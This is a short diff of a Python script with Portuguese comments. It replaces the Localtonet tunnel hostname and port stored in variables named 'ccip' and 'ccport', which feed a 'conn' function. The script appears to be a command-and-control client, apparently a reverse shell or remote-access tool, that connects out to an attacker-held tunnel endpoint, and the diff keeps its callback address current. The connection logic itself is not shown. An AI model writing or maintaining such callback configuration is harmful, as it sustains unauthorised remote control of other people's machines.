@@ -6,9 +6,9 @@ import os
 import sys
 import platform
 
-# Configuração gerada pelo seu túnel Localtonet
-ccip = "c9zpn4cvhs.localto.net"
-ccport = 4985
+# Configuração atualizada do túnel Localtonet
+ccip = "at3xxtumny.localto.net"
+ccport = 8400
 
 def conn(ccip, ccport):
     try:
